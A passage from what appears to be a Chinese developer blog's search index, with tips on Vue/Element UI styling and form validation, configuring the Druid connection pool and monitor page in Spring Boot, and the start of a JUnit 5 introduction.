中修改默认样式无效"></a>Element 中修改默认样式无效</h2><p>第一种：使用<strong>深度作用选择器</strong>：<code> /deep/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style scoped&gt;</span><br><span class="line">.el-card__body /deep/ &#123;</span><br><span class="line">  padding: 0px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>第二种：使用父级类名加&gt;&gt;&gt; 深入符号直接强制更改</p><p>1.在父元素中写一个类名</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190626110927548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMTM5MzQ4,size_16,color_FFFFFF,t_70" alt="img"></p><p>2.然后通过f12审查元素找到子级默认样式的类名：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190626111415349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMTM5MzQ4,size_16,color_FFFFFF,t_70" alt="img"></p><p>3.为不改变全局样式，使用父级类名加&gt;&gt;&gt; 深入符号直接强制更改，即可完成效果：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019062611161854.png" alt="img"></p><h2 id="浏览器控制台关于sockjs-js报错"><a href="#浏览器控制台关于sockjs-js报错" class="headerlink" title="浏览器控制台关于sockjs.js报错"></a>浏览器控制台关于sockjs.js报错</h2><p>错误如下：<code>sockjs.js?9be2:1606 GET http://192.168.43.226:8080/sockjs-node/info?t=1584966826465 net::ERR_CONNECTION_TIMED_OUT</code></p><p>网上找到的原因说是：<code>sockjs-node</code>是一个JavaScript库，提供跨浏览器JavaScript的API，创建了一个低延迟、全双工的浏览器和web服务器之间通信通道。在项目运行以后，network会一直调用这个接口。如果没有使用，那么就一直会报这个异常。</p><p>解决方法：</p><p>1）找到<code>/node_modules/sockjs-client/dist/sockjs.js文件</code><br>2）在1600行左右，注释掉<code>self.xhr.send(payload);</code>这一行，然后就可以解决了。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200323203614792.png"></p><h2 id="VUE表单验证报错（’validate’-）"><a href="#VUE表单验证报错（’validate’-）" class="headerlink" title="VUE表单验证报错（’validate’ ）"></a>VUE表单验证报错（’validate’ ）</h2><p>报错如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Vue warn]: Error in v-on handler: &quot;TypeError: Cannot read property &#x27;validate&#x27; of undefined&quot;</span><br></pre></td></tr></table></figure><p>解决：<strong>refs和ref名字保持一致，如果不行可以把refs后面的[ ]去掉试试</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-form :model=&quot;unitForm&quot; ref=&quot;unitForm&quot; label-width=&quot;100px&quot; class=&quot;demo-dynamic&quot;&gt;</span><br><span class="line">...</span><br><span class="line">submitForm(unitForm) &#123;</span><br><span class="line">  this.$refs.unitForm.validate((valid) =&gt; &#123;</span><br></pre></td></tr></table></figure><h2 id="VUE表单验证报错（有值却报错）"><a href="#VUE表单验证报错（有值却报错）" class="headerlink" title="VUE表单验证报错（有值却报错）"></a>VUE表单验证报错（有值却报错）</h2><p> Form表单验证踩坑（表单验证明明有值，却提示错误）</p><blockquote><p>prop对应的不单单是rules规则里面的验证项，同时对应着我们form-item下的v-model的值。prop绑定的类要与el-form-item下的v-model的值相对应。</p></blockquote><p>我是因为rules绑定了数组的某个字段而失败，修改后(<strong>注意prop的值</strong>)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-form-item</span><br><span class="line">          v-for=&quot;(unit, index) in unitForm.units&quot;</span><br><span class="line">          :label=&quot;&#x27;第&#x27; + (index+2) + &#x27;章&#x27;&quot;</span><br><span class="line">          :key=&quot;index&quot;</span><br><span class="line">          :prop=&quot;`units[$&#123;index&#125;].unitName`&quot;</span><br><span class="line">          :rules=&quot;&#123;required: true, message: &#x27;章节名称不能为空&#x27;, trigger: &#x27;blur&#x27;&#125;&quot;&gt;</span><br><span class="line">        &lt;el-input v-model=&quot;unit.unitName&quot; style=&quot;width: 270px&quot;&gt;&lt;/el-input&gt;</span><br><span class="line">        &lt;el-button @click.prevent=&quot;removeUnit(unit)&quot; style=&quot;margin-left: 20px&quot;&gt;删除&lt;/el-button&gt;</span><br><span class="line">      &lt;/el-form-item&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      unitForm: &#123;</span><br><span class="line">        units: [&#123;</span><br><span class="line">          unitId: &#x27;&#x27;,</span><br><span class="line">          unitName: &#x27;&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        ],</span><br><span class="line">        unit1: &#123;</span><br><span class="line">          unitId: &#x27;1&#x27;,</span><br><span class="line">          unitName: &#x27;dwqqw&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><h2 id="Element中抽屉去除标题自带蓝色框"><a href="#Element中抽屉去除标题自带蓝色框" class="headerlink" title="Element中抽屉去除标题自带蓝色框"></a>Element中抽屉去除标题自带蓝色框</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/deep/ <span class="selector-pseudo">:focus</span> &#123;</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Druid数据源的使用</title>
      <link href="/posts/13be/"/>
      <url>/posts/13be/</url>
      
        <content type="html"><![CDATA[<p>目前市场上最主流的数据源，是阿里巴巴计算平台事业部出品，为<strong>监控</strong>而生的数据库连接池。</p><blockquote><p>官网地址：<a href="https://github.com/alibaba/druid">https://github.com/alibaba/druid</a></p><p>中文文档：<a href="https://github.com/alibaba/druid/wiki/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">https://github.com/alibaba/druid/wiki/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98</a></p></blockquote><p>整合Druid的两种方式：</p><ul><li>导入相关依赖进行自定义配置</li><li>使用starter场景启动器自动配置</li></ul><h1 id="自定义方式"><a href="#自定义方式" class="headerlink" title="自定义方式"></a>自定义方式</h1><h2 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;characterEncoding=UTF-8</span></span><br></pre></td></tr></table></figure><h2 id="配置示例【常见问题】"><a href="#配置示例【常见问题】" class="headerlink" title="配置示例【常见问题】"></a>配置示例【<a href="https://github.com/alibaba/druid/wiki/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">常见问题</a>】</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.support.http.StatViewServlet;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.support.http.WebStatFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.ServletRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataSourceConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @ConfigurationProperties可以自动将配置文件中的字段映射到对象的属性中</span></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix = &quot;spring.data&quot;)</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">dataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">DruidDataSource</span> <span class="variable">druidDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidDataSource</span>();</span><br><span class="line">        <span class="comment">//StatFilter（别名是stat），用于统计监控信息；WallFilter，它是基于SQL语义分析来实现防御SQL注入攻击的。</span></span><br><span class="line">        druidDataSource.addFilters(<span class="string">&quot;stat,wall&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> druidDataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置Druid的内置监控页面，用于展示Druid的统计信息。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ServletRegistrationBean <span class="title function_">statViewServlet</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">StatViewServlet</span> <span class="variable">statViewServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StatViewServlet</span>();</span><br><span class="line">        ServletRegistrationBean&lt;StatViewServlet&gt; servletRegistrationBean = <span class="keyword">new</span> <span class="title class_">ServletRegistrationBean</span>&lt;&gt;(statViewServlet,<span class="string">&quot;/druid/*&quot;</span>);</span><br><span class="line">        <span class="comment">//配置监控页面访问密码</span></span><br><span class="line">        servletRegistrationBean.addInitParameter(<span class="string">&quot;loginUsername&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        servletRegistrationBean.addInitParameter(<span class="string">&quot;loginPassword&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        <span class="comment">//不允许清空统计数据</span></span><br><span class="line">        servletRegistrationBean.addInitParameter(<span class="string">&quot;resetEnable&quot;</span>,<span class="string">&quot;false&quot;</span>);</span><br><span class="line">        <span class="comment">//IP地址访问控制（deny优先于allow）</span></span><br><span class="line">        servletRegistrationBean.addInitParameter(<span class="string">&quot;allow&quot;</span>,<span class="string">&quot;128.242.127.1/24,127.0.0.1&quot;</span>);</span><br><span class="line">        servletRegistrationBean.addInitParameter(<span class="string">&quot;deny&quot;</span>,<span class="string">&quot;128.242.127.4&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> servletRegistrationBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * WebStatFilter用于采集web-jdbc关联监控的数据。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean <span class="title function_">webStatFilter</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">WebStatFilter</span> <span class="variable">webStatFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebStatFilter</span>();</span><br><span class="line">        FilterRegistrationBean&lt;WebStatFilter&gt; filterRegistrationBean = <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>&lt;&gt;(webStatFilter);</span><br><span class="line">        filterRegistrationBean.addInitParameter(<span class="string">&quot;exclusions&quot;</span>,<span class="string">&quot;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> filterRegistrationBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问Druid监控页"><a href="#访问Druid监控页" class="headerlink" title="访问Druid监控页"></a>访问Druid监控页</h2><p><a href="http://localhost:8080/druid/index.html">http://localhost:8080/druid/index.html</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210110004042.png"></p><hr><h1 id="使用官方starter方式【推荐】"><a href="#使用官方starter方式【推荐】" class="headerlink" title="使用官方starter方式【推荐】"></a>使用官方starter方式【推荐】</h1><h2 id="导入依赖-1"><a href="#导入依赖-1" class="headerlink" title="导入依赖"></a>导入依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分析自动配置"><a href="#分析自动配置" class="headerlink" title="分析自动配置"></a>分析自动配置</h2><ul><li>扩展配置项 <strong>spring.datasource.druid</strong></li><li>DruidSpringAopConfiguration.<strong>class</strong>,  监控SpringBean的；配置项：<strong>spring.datasource.druid.aop-patterns</strong></li><li>DruidStatViewServletConfiguration.<strong>class</strong>, 监控页的配置：<strong>spring.datasource.druid.stat-view-servlet；默认开启</strong></li><li>DruidWebStatFilterConfiguration.<strong>class</strong>, web监控配置；<strong>spring.datasource.druid.web-stat-filter；默认开启</strong></li><li>DruidFilterConfiguration.<strong>class</strong>}) 所有Druid自己filter的配置</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILTER_STAT_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;spring.datasource.druid.filter.stat&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILTER_CONFIG_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;spring.datasource.druid.filter.config&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILTER_ENCODING_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;spring.datasource.druid.filter.encoding&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILTER_SLF4J_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;spring.datasource.druid.filter.slf4j&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILTER_LOG4J_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;spring.datasource.druid.filter.log4j&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILTER_LOG4J2_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;spring.datasource.druid.filter.log4j2&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILTER_COMMONS_LOG_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;spring.datasource.druid.filter.commons-log&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILTER_WALL_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;spring.datasource.druid.filter.wall&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="配置示例"><a href="#配置示例" class="headerlink" title="配置示例"></a>配置示例</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/test?serverTimezone=Asia/Shanghai&amp;characterEncoding=UTF-8</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">druid:</span></span><br><span class="line">      <span class="attr">aop-patterns:</span> <span class="string">top.nanzx.*</span>  <span class="comment">#监控SpringBean</span></span><br><span class="line">      <span class="attr">filters:</span> <span class="string">stat,wall</span>     <span class="comment"># 底层开启功能，stat（sql监控），wall（防火墙）</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">stat-view-servlet:</span>   <span class="comment"># 配置监控页功能</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">login-username:</span> <span class="string">admin</span></span><br><span class="line">        <span class="attr">login-password:</span> <span class="number">123456</span></span><br><span class="line">        <span class="attr">resetEnable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">web-stat-filter:</span>  <span class="comment"># 监控web</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">urlPattern:</span> <span class="string">/*</span></span><br><span class="line">        <span class="attr">exclusions:</span> <span class="string">&#x27;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">filter:</span></span><br><span class="line">        <span class="attr">stat:</span>    <span class="comment"># 对上面filters里面的stat的详细配置</span></span><br><span class="line">          <span class="attr">slow-sql-millis:</span> <span class="number">1000</span></span><br><span class="line">          <span class="attr">logSlowSql:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">wall:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">config:</span></span><br><span class="line">            <span class="attr">drop-table-allow:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/alibaba/druid/tree/master/druid-spring-boot-starter">SpringBoot配置示例</a></p><p><a href="https://github.com/alibaba/druid/wiki/DruidDataSource%E9%85%8D%E7%BD%AE%E5%B1%9E%E6%80%A7%E5%88%97%E8%A1%A8">配置项列表</a></p>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Druid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单元测试</title>
      <link href="/posts/610b/"/>
      <url>/posts/610b/</url>
      
        <content type="html"><![CDATA[<h1 id="JUnit5-的变化"><a href="#JUnit5-的变化" class="headerlink" title="JUnit5 的变化"></a>JUnit5 的变化</h1><p><strong>Spring Boot 2.2.0 版本开始引入 JUnit 5 作为单元测试默认库</strong></p><p>作为最新版本的JUnit框架，JUnit5与之前版本的Junit框架有很大的不同。由三个不同子项目的几个不同模块组成。</p><blockquote><p><strong>JUnit 5 &#x3D; JUnit Platform + JUnit Jupiter + JUnit Vintage</strong></p></blockquote><p><strong>JUnit Platform</strong>: Junit Platform是在JVM上启动测试框架的基础，不仅支持Junit自制的测试引擎，其他测试引擎也都可以接入。</p><p><strong>JUnit Jupiter</strong>: JUnit Jupiter提供了JUnit5的新的编程模型，是JUnit5新特性的核心。内部包含了一个<strong>测试引擎</strong>，用于在Junit Platform上运行。</p><p><strong>JUnit Vintage</strong>: 由于JUint已经发展多年，为了照顾老的项目，JUnit Vintage提供了兼容JUnit4.x，Junit3.x的测试引擎。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210102123433.png"></p><p><strong>注意：</strong></p><ul><li>SpringBoot 2.4 以上版本移除了默认对 Vintage 的依赖。如果需要兼容JUnit4，则需自行引入（不能使用JUnit4的功能 @Test）。<strong>JUnit 5’s Vintage Engine Removed from</strong> <strong><code>spring-boot-starter-test</code></strong></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hamcrest<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hamcrest-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><p>导入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以前版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boot05WebAdminApplicationTests</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在Spring boot 2.1.x之前， @SpringBootTest需要配合@ExtendWith(SpringExtension.class)才能正常工作的，现在@SpringBootTest已经整合了它</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boot05WebAdminApplicationTests</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpringBoot整合Junit以后：</p><ul><li>编写测试方法：@Test标注（注意需要使用junit5版本的注解）</li><li>Junit类具有Spring的功能：@Autowired、比如 @Transactional 